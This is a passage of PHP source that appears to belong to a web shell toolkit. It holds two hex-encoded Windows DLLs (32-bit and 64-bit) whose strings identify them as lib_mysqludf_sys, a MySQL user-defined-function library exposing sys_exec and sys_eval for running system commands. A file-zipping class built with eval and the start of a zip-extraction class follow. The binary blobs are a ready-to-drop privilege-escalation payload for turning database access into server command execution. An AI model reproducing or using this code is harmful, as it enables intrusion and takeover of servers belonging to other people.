6DCE0A330A6C21539C82056BF82A64D46E64133D6184C90F651E5F2C72346BCDB5AD56ED6D1C18700A036EDF177B5F706F52296E106468756CC9DEA3F05EB92A9B1B6CB7B5652CA8066EC5726525BD6D705B0866115673749C637079AE3517C108243932C06EADE1F6664D0FD76F7319663A1DC2F60F1F5F437070583174BC6DFFFF63AF343F0018183D193C1C1B161E552719111F0A062FFFFFFFFF111D5F10130A070D2E15090905140C1B08090B150618141505061B050C0D0608FDDBBFFD190613050D0F120F1D07050509062E0D18532D483406B7DB72F20007080C3B060A390C05DF6E6FB710070616120E0B06420B215637051F05776FB7EE9F0E5D2C0D001D4C61230D0C2E24080B97FFB7634106F0021004F02C01043808041C1C040090FE1D05ED4C0105004E10A34D867E93B6FFE00002210B0108080C8E003816B6B1B1C10B200E100B020204FEEC61C1330700600C4B070100023C1BD8C12A00100706C026DFB62B04A420AC22033C1440EB0D60750B0113509F3AB72CF62AC8214200A7BB0B0359B82F2EAB787407C20A271BD860900CC442602E61B0DBD27264746108C508FB0A139AED862D0077402E26943DA1DBC20304301B001A27061BECDBC04F73726300EB40271CF8A311C04F5C6D009A01DF948C4D03271E421BA000B463B72303D152127353030000000000000012FF00000000000000807C2408010F85B901000060BE007000108DBE00A0FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B92B0000008A07472CE83C0177F7803F0075F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE005000008B0709C0743C8B5F048D8430B071000001F35083C708FF96EC710000958A074708C074DC89F95748F2AE55FF96F071000009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAEF47100008DBE00F0FFFFBB0010000050546A045357FFD58D870702000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E99F98FFFF000000480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000101022001001000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005C80000052010000E404000000000000584000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564338302E435254222076657273696F6E3D22382E302E35303630382E30222070726F636573736F724172636869746563747572653D2278383622207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E50410000000000000000000000000C820000EC810000000000000000000000000000198200000482000000000000000000000000000000000000000000002482000032820000428200005282000060820000000000006E820000000000004B45524E454C33322E444C4C004D5356435238302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C467265650000006672656500000000000000004D10A34D0000000054830000010000001200000012000000A0820000E8820000308300002210000021100000001000008F120000211000008C120000C51100002110000087110000B311000021100000871100007710000021100000441000002F1100001B110000AA100000698300007F8300009C830000B7830000C3830000D6830000E7830000F0830000008400000E8400001784000027840000358400003D8400004C84000059840000618400007084000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E6974000000000070000010000000DD3BD83DDC3D00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
}
function Mysql_shellcode64()
{
	return 	"0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000F00000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A240000000000000033C2EDE077A383B377A383B377A383B369F110B375A383B369F100B37DA383B369F107B375A383B35065F8B374A383B377A382B35BA383B369F10AB376A383B369F116B375A383B369F111B376A383B369F112B376A383B35269636877A383B300000000000000000000000000000000504500006486060070B1834B0000000000000000F00022200B020900001200000016000000000000341A0000001000000000008001000000001000000002000005000200000000000500020000000000008000000004000033CE000002004001000010000000000000100000000000000000100000000000001000000000000000000000100000000039000005020000403400003C00000000600000B002000000500000680100000000000000000000007000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000300000700100000000000000000000000000000000000000000000000000002E7465787400000011100000001000000012000000040000000000000000000000000000200000602E72646174610000050B000000300000000C000000160000000000000000000000000000400000402E64617461000000D8050000004000000002000000220000000000000000000000000000400000C02E7064617461000068010000005000000002000000240000000000000000000000000000400000402E72737263000000B0020000006000000004000000260000000000000000000000000000400000402E72656C6F630000240000000070000000020000002A00000000000000000000000000004000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000833A007450488B05A4210000498900488B05A221000049894008488B059F21000049894010488B059C21000049894018488B059921000049894020488B0596210000498940280FB705932100006641894030B001C332C0C3CCCCCCCCCCCCCCCC488B0581210000498900488B057F21000049894008488B057C210000498940108B057A210000418940180FB70573210000664189401C0FB605692100004188401E41C7011E000000498BC0C3CCCCCCCC833A01750F488B42088338007506C6010132C0C3488B053D210000498900488B053B21000049894008488B053821000049894010488B053521000049894018488B0532210000498940200FB7052F21000066418940280FB605252100004188402AB001C3CCCCCCCCCCCCCCCCCCCCCCCC40534883EC20488B4A10498BD9488B09FF15DA1F00004C8BD84885C0750E488B4C2450C601014883C4205BC348897C243033C04883C9FF498BFBF2AE488B7C2430498BC348F7D148FFC9890B4883C4205BC3CCCCCCCCCCCCCCCCCCCCCCCCCCCC48895C2408574883EC20833A02498BD8488BF97455488D0D64EEFFFF488B8138320000498900488B814032000049894008488B8148320000498940108B8150320000418940180FB78154320000664189401C0FB681563200004188401EB001488B5C24304883C4205FC3488B4208833800744A488D0D06EEFFFF488B8158320000498900488B816032000049894008488B816832000049894010488B817032000049894018488B817832000049894020B001488B5C24304883C4205FC3C7400400000000488B42188B48048B008D4C0102FF15E91E0000488947104885C0753F488D0D99EDFFFF488B8180320000488903488B818832000048894308488B8190320000488943100FB7819832000066894318B001488B5C24304883C4205FC332C0488B5C24304883C4205FC3CCCCCCCC4883EC28488B49104885C97406FF158D1E00004883C428C3CCCCCCCCCCCCCCCC48895C24084889742410574883EC20488B4218488B7110488BFA488B5210448B00488BCE488B12498D5C3001E8750C00004C8B5F18488BCB418B03C6043000488B4718488B5710448B4004488B5208E8520C00004C8B5F18488BD3418B4304488BCEC6041800FF15D41C0000488B5C2430488B74243848984883C4205FC3CCCC833A01750C488B4208833800750332C0C3488B05A01E0000498900488B059E1E000049894008488B059B1E000049894010488B05981E000049894018488B05951E0000498940200FB705921E000066418940280FB605881E00004188402AB001C3CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC4883EC28488B4A10488B09FF155F1D000048984883C428C3CCCCCCCCCCCCCCCC4056574154415541564881EC30040000488B05092C00004833C448898424200400004C8BAC2480040000B9010000004889AC24700400004D8BF1488BFAFF151D1D0000488B4F10488D156E1E00004533E4488B09488BF0FF15FB1C0000488D4C2420BA000400004C8BC0488BE8FF15CD1C00004885C0746648899C24600400004883C9FF33C0488D7C2420F2AE48F7D1428D5C21FF488D79FF488BCE8BD3FF15941C0000418BCC488D5424204803C8448BC7488BF0FF158D1C0000488D4C24204C8BC5BA00040000448BE3FF156F1C00004885C075AA488B9C2460040000488BCDFF15811C0000803E00488BAC2470040000741F4883C9FF418D4424FF488BFEC604300033C0F2AE48F7D148FFC941890EEB0541C6450001488BC6488B8C24200400004833CCE8150100004881C430040000415E415D415C5F5EC3CCCCCCCCCC32C0C3CCCCCCCCCCCCCCCCCCCCCCCCCCC20000CCCCCCCCCCCCCCCCCCCCCCCCCC48895C24084889742418574883EC30488B7A104883C9FF33C0488B3F488BF2448D4840F2AE41B80010000048F7D1488BD1488D79FF33C9FF158B1A0000488B56104C8BC7488B12488BC8488BD8FF15951B0000488D5424484C8D054100000048895424284C8BCB33C933D2C744242000000000FF155F1A000083CAFF488BC8FF153B1A0000488B5C2440488B74245033C04883C4305FC3CCCCCCCCCCCCCCCCCC4883EC28E817000000EB0033C04883C428C3CCCCCCCCCCCCCCCCCCCCCCCCCCCC55488BEC488B4510FF10C9C3CCCCCCCCCCCCCCCCCCCC66660F1F840000000000483B0DD9290000751148C1C11066F7C1FFFF7502F3C348C1C910E935040000CC40534883EC20B900010000FF15AF1A0000488BC8488BD8FF15AB1A0000488905642F0000488905552F00004885DB75058D4301EB2348832300E816060000488D0D47060000E8F2050000488D0D2F050000E8E605000033C04883C4205BC3CCCC488BC44889580848896810488978184C8960204155415641574883EC2033FF4D8BE04C8BE93BD70F85380100008B054D2900003BC70F8E23010000FFC8448BEF89053A29000065488B042530000000488B5808EB10483BC3741AB9E8030000FF158319000033C0F0480FB11DA82E000075E3EB0641BD010000008B05902E000083F802740FB91F000000E8AF060000E9A1010000488B0D8D2E0000FF156F1900004C8BE0483BC70F8496000000488B0D6C2E0000FF15561900004D8BFC4C8BF0488BE84883ED08493BEC725A48397D0074F1FF15701900004839450074E5488B4D00FF1528190000488BD8FF155719000048894500FFD3488B0D2A2E0000FF150C190000488B0D152E0000488BD8FF15FC1800004C3BFB75054C3BF074A54C8BFB4C8BE3EB97498BCCFF1581190000FF1513190000488905E42D0000488905E52D0000893DC72D0000443BEF0F85E300000048873DBF2D0000E9D700000033C0E9D500000083FA010F85C700000065488B0425300000008BEF488B5808EB10483BC3741AB9E8030000FF155918000033C0F0480FB11D7E2D000075E3EB05BD010000008B05672D00003BC7740CB91F000000E887050000EB3E488D1530190000488D0D19190000C7053F2D000001000000E8620500003BC77584488D15F7180000488D0DE8180000E845050000C705192D0000020000003BEF750A488BC7488705132D000048393D242D00007421488D0D1B2D0000E8D60400003BC774114D8BC4BA02000000498BCDFF15012D0000FF054B270000B801000000488B5C2440488B6C2448488B7C24504C8B6424584883C420415F415E415DC3CCCCCC488BC448895808488970104889781841544883EC30498BF08BFA4C8BE1BB010000008958E88915E926000085D275123915EF260000750A33DB8958E8E9CA00000083FA01740583FA027533488B054A1800004885C07408FFD08BD88944242085DB74134C8BC68BD7498BCCE834FDFFFF8BD88944242085DB0F848D0000004C8BC68BD7498BCCE8690400008BD88944242083FF01753585C075314C8BC633D2498BCCE84D0400004C8BC633D2498BCCE8F0FCFFFF4C8B1DE11700004D85DB740B4C8BC633D2498BCC41FFD385FF740583FF0375374C8BC68BD7498BCCE8C3FCFFFFF7D81BC923CB8BD9894C2420741C488B05A61700004885C074104C8BC68BD7498BCCFFD08BD889442420EB0633DB895C2420C705F7250000FFFFFFFF8BC3488B5C2440488B742448488B7C24504883C430415CC3CCCCCC48895C24084889742410574883EC20498BF88BDA488BF183FA017505E8BF0300004C8BC78BD3488BCE488B5C2430488B7424384883C4205FE98BFEFFFFCCCCCC48894C24084881EC88000000488D0D49260000FF15BB1500004C8B1D342700004C895C24584533C0488D542460488B4C2458E841040000488944245048837C245000744148C744243800000000488D4424484889442430488D4424404889442428488D05F425000048894424204C8B4C24504C8B442458488B54246033C9E8EF030000EB22488B842488000000488905C0260000488D8424880000004883C0084889054D260000488B05A626000048890517250000488B84249000000048890518260000C705EE240000090400C0C705E824000001000000488B05AD2400004889442468488B05A92400004889442470FF15F6140000890558250000B901000000E84E03000033C9FF15E6140000488D0D17160000FF15E1140000833D3225000000750AB901000000E826030000FF15D0140000BA090400C0488BC8FF15CA1400004881C488000000C3CCCC488D0DD9290000E90203000040534883EC20488BD9488B0DEC290000FF15CE14000048894424384883F8FF750B488BCBFF15EA140000EB7EB908000000E8DE02000090488B0DBE290000FF15A01400004889442438488B0DA4290000FF158E1400004889442440488BCBFF15D8140000488BC84C8D442440488D542438E898020000488BD8488B4C2438FF15B814000048890571290000488B4C2440FF15A614000048890557290000B908000000E861020000488BC34883C4205BC34883EC28E847FFFFFF48F7D81BC0F7D8FFC84883C428C3CC48895C2408574883EC20488D1D03160000488D3DFC150000EB0E488B034885C07402FFD04883C308483BDF72ED488B5C24304883C4205FC348895C2408574883EC20488D1DDB150000488D3DD4150000EB0E488B034885C07402FFD04883C308483BDF72ED488B5C24304883C4205FC3CCCCCCCCCCCCCCCCCCCCCCCC488BC1B94D5A0000663908740333C0C34863483C4803C833C0813950450000750CBA0B020000663951180F94C0F3C3CC4C63413C4533C94C8BD24C03C1410FB74014450FB758064A8D4C00184585DB741E8B510C4C3BD2720A8B410803C24C3BD0720F41FFC14883C128453BCB72E233C0C3488BC1C3CCCCCCCCCCCCCCCCCCCC4883EC284C8BC14C8D0D62E2FFFF498BC9E86AFFFFFF85C074224D2BC1498BD0498BC9E888FFFFFF4885C0740F8B4024C1E81FF7D083E001EB0233C04883C428C3CCFF2520130000FF2512130000FF25BC120000FF25BE120000FF25681300004883EC2883FA01751048833D97130000007506FF1537120000B8010000004883C428C3CC48895C2418574883EC20488B05DB21000048836424300048BF32A2DF2D992B0000483BC7740C48F7D0488905C4210000EB76488D4C2430FF153F120000488B5C2430FF15C4110000448BD84933DBFF15C0110000448BD84933DBFF15BC110000488D4C2438448BD84933DBFF15B31100004C8B5C24384C33DB48B8FFFFFFFFFFFF00004C23D848B833A2DF2D992B00004C3BDF4C0F44D84C891D4E21000049F7D34C891D4C210000488B5C24404883C4205FC3CCFF25EA110000FF25EC110000FF25EE110000FF25F0110000FF25F2110000FF256C110000FF255E110000CCCC40534883EC20458B18488BDA4C8BC94183E3F841F600044C8BD17413418B40084D635004F7D84C03D14863C84C23D14963C34A8B1410488B43108B480848034B08F641030F740C0FB6410383E0F048984C03C84C33CA498BC94883C4205BE9C9F6FFFFCC4883EC284D8B4138488BCA498BD1E889FFFFFFB8010000004883C428C3CCFF25E4110000CCCCCCCC40554883EC20488BEA488BD148894D28488B018B08894D24E84DFEFFFF4883C4205DC3CCCCCCCCCCCCCCCCCCCCCCCCCC40554883EC20488BEAC7054D200000FFFFFFFF4883C4205DC340554883EC20488BEAB908000000E8F8FEFFFF4883C4205DC3CCCCCCCCCCCCCCCCCCCCCCCCCCCC40554883EC20488BEA488B0133C98138050000C00F94C18BC18BC14883C4205DC3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F035000000000000063600000000000016360000000000003036000000000000C438000000000000AE380000000000009E380000000000008438000000000000683800000000000054380000000000003A3800000000000026380000000000001238000000000000F437000000000000D837000000000000C437000000000000B037000000000000A837000000000000DA3800000000000000000000000000000C370000000000001A37000000000000FA3600000000000044370000000000005A370000000000007E37000000000000883700000000000096370000000000009E37000000000000EA36000000000000DC36000000000000D036000000000000C236000000000000B0360000000000009A36000000000000903600000000000088360000000000007E3600000000000074360000000000006A36000000000000603600000000000056360000000000004E360000000000003237000000000000F43800000000000000000000000000000000000000000000000000000000000000000000000000004016008001000000000000000000000000000000000000003040008001000000D0400080010000004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279000000720000000000000000000000000000000000000000000000000000000000000000000000011D0C001DC40B001D740A001D5409001D3408001D3219F017E015D01915080015740A001564090015340800155211C0E41D00000200000027190000091A0000801F0000091A0000211900000F1A0000B01F000000000000010F06000F6407000F3406000F320B70010C02000C01110001060200063202501106020006320230E41D000001000000031C0000691C0000C91F0000000000000904010004420000E41D000001000000971D0000CA1D0000F01F0000CA1D00000104010004420000010A04000A3408000A3206700904010004420000E41D000001000000E4150000EB15000001000000EB150000010F06000F640A000F3408000F520B7021000000E01300000F14000004340000210000000F14000058140000F03300002108020008348C000F14000058140000F03300002108020008548E00E01300000F14000004340000192207001001860009E007D005C0037002600000581F000020040000010A04000A3406000A32067001310400317406000632023001060200063202308034000000000000000000004036000000300000203500000000000000000000A4360000A0300000000000000000000000000000000000000000000000000000F035000000000000063600000000000016360000000000003036000000000000C438000000000000AE380000000000009E380000000000008438000000000000683800000000000054380000000000003A3800000000000026380000000000001238000000000000F437000000000000D837000000000000C437000000000000B037000000000000A837000000000000DA3800000000000000000000000000000C370000000000001A37000000000000FA3600000000000044370000000000005A370000000000007E37000000000000883700000000000096370000000000009E37000000000000EA36000000000000DC36000000000000D036000000000000C236000000000000B0360000000000009A36000000000000903600000000000088360000000000007E3600000000000074360000000000006A36000000000000603600000000000056360000000000004E360000000000003237000000000000F4380000000000000000000000000000680457616974466F7253696E676C654F626A6563740058045669727475616C416C6C6F630000D503536574456E7669726F6E6D656E745661726961626C654100A30043726561746554687265616400004B45524E454C33322E646C6C0000AC04667265650000E7025F70636C6F736500E5046D616C6C6F630000EB025F706F70656E00003B0573797374656D00002B057374726E637079009B0466676574730006057265616C6C6F6300BC04676574656E7600004D5356435239302E646C6C0037015F656E636F64655F706F696E746572004E025F6D616C6C6F635F63727400CE015F696E69747465726D00CF015F696E69747465726D5F650038015F656E636F6465645F6E756C6C002D015F6465636F64655F706F696E74657200E2005F616D73675F65786974000059005F5F435F73706563696669635F68616E646C657200005A005F5F4370705863707446696C7465720083005F5F6372745F64656275676765725F686F6F6B007B005F5F636C65616E5F747970655F696E666F5F6E616D65735F696E7465726E616C0000A4035F756E6C6F636B0085005F5F646C6C6F6E65786974003D025F6C6F636B00E4025F6F6E65786974002504536C6565700031045465726D696E61746550726F636573730000AA0147657443757272656E7450726F63657373004204556E68616E646C6564457863657074696F6E46696C74657200001904536574556E68616E646C6564457863657074696F6E46696C74657200CB024973446562756767657250726573656E7400970352746C5669727475616C556E77696E640000900352746C4C6F6F6B757046756E6374696F6E456E7472790000890352746C43617074757265436F6E7465787400CC0044697361626C655468726561644C69627261727943616C6C73004E035175657279506572666F726D616E6365436F756E7465720066024765745469636B436F756E740000AE0147657443757272656E7454687265616449640000AB0147657443757272656E7450726F636573734964004F0247657453797374656D54696D65417346696C6554696D6500F0046D656D637079000000000000000070B1834B00000000DC3900000100000012000000120000002839000070390000B8390000601000003015000000100000401500003015000020150000E01300003015000050130000C013000030150000501300002011000030150000B0100000D0120000B012000080110000F1390000073A0000243A00003F3A00004B3A00005E3A00006F3A0000783A0000883A0000963A00009F3A0000AF3A0000BD3A0000C53A0000D43A0000E13A0000E93A0000F83A000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E697400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000032A2DF2D992B0000CD5D20D266D4FFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020110000721100002C34000080110000AC12000020340000B0120000C812000078330000D01200004E13000018330000C0130000D813000078330000E01300000F140000043400000F14000058140000F033000058140000BE140000DC330000BE140000D4140000CC330000D41400001B150000BC33000040150000D7150000AC330000E0150000F21500008C330000401600009E16000038340000A0160000F9180000C0320000FC180000311A0000DC320000341A0000711A000018330000741A0000BE1B000028330000CC1B00007C1C0000383300007C1C0000931C000078330000941C0000CC1C000020340000CC1C0000041D000020340000901D0000D11D000058330000F01D0000131E000078330000141E0000C71E000080330000F41E0000571F000038340000581F0000751F000078330000801F0000A31F000030330000B01F0000C91F000030330000C91F0000E21F000030330000F01F0000112000003033000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005860000058020000E4040000000000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C656765733E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365223E3C2F726571756573746564457865637574696F6E4C6576656C3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564339302E435254222076657273696F6E3D22392E302E32313032322E38222070726F636573736F724172636869746563747572653D22616D64363422207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E50414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E47003000001000000088A1A0A1A8A1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
}

class eanver{
var $out='';
function __construct($dir){
	if(@function_exists('gzcompress')){
	if(count($dir) > 0){
	foreach($dir as $file){
		if(is_file($file)){
			$filecode = file_get_contents($file);
			if(is_array($dir)) $file = basename($file);
			$this -> filezip($filecode,$file);
		}
	}
	$this->out = $this -> packfile();
	}
	return true;
	}
	else return false;
}
	var $datasec      = array();
	var $ctrl_dir     = array();
	var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset   = 0;
	function at($atunix = 0) {
		$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
		if ($unixarr['year'] < 1980) {
			$unixarr['year']    = 1980;
			$unixarr['mon']     = 1;
			$unixarr['mday']    = 1;
			$unixarr['hours']   = 0;
			$unixarr['minutes'] = 0;
			$unixarr['seconds'] = 0;
		}
		return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) |
				($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
	}
	function filezip($data, $name, $time = 0) {
		$name = str_replace('\\', '/', $name);
		$dtime = dechex($this->at($time));
		$hexdtime	= '\x' . $dtime[6] . $dtime[7]
					. '\x' . $dtime[4] . $dtime[5]
					. '\x' . $dtime[2] . $dtime[3]
					. '\x' . $dtime[0] . $dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');
		$fr	= "\x50\x4b\x03\x04";
		$fr	.= "\x14\x00";
		$fr	.= "\x00\x00";
		$fr	.= "\x08\x00";
		$fr	.= $hexdtime;
		$unc_len = strlen($data);
		$crc = crc32($data);
		$zdata = gzcompress($data);
		$c_len = strlen($zdata);
		$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$fr .= pack('v', strlen($name));
		$fr .= pack('v', 0);
		$fr .= $name;
		$fr .= $zdata;
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$this -> datasec[] = $fr;
		$new_offset = strlen(implode('', $this->datasec));
		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x14\x00";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x08\x00";
		$cdrec .= $hexdtime;
		$cdrec .= pack('V', $crc);
		$cdrec .= pack('V', $c_len);
		$cdrec .= pack('V', $unc_len);
		$cdrec .= pack('v', strlen($name) );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('V', 32 );
		$cdrec .= pack('V', $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;
		$this -> ctrl_dir[] = $cdrec;
	}
	function packfile(){
		$data    = implode('', $this -> datasec);
		$ctrldir = implode('', $this -> ctrl_dir);
		return $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data))."\x00\x00";
	}
}

class zip
{

 var $total_files = 0;
 var $total_folders = 0;

 function Extract ( $zn, $to, $index = Array(-1) )
 {
   $ok = 0; $zip = @fopen($zn,'rb');
   if(!$zip) return(-1);
   $cdir = $this->ReadCentralDir($zip,$zn);
   $pos_entry = $cdir['offset'];

   if(!is_array($index)){ $index = array($index);  }
   for($i=0; $index[$i];$i++){
   		if(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])
		return(-1);
   }
   for ($i=0; $i<$cdir['entries']; $i++)
   {
     @fseek($zip, $pos_entry);
     $header = $this->ReadCentralFileHeaders($zip);
     $header['index'] = $i; $pos_entry = ftell($zip);
     @rewind($zip); fseek($zip, $header['offset']);
     if(in_array("-1",$index)||in_array($i,$index))
     	$stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);
   }
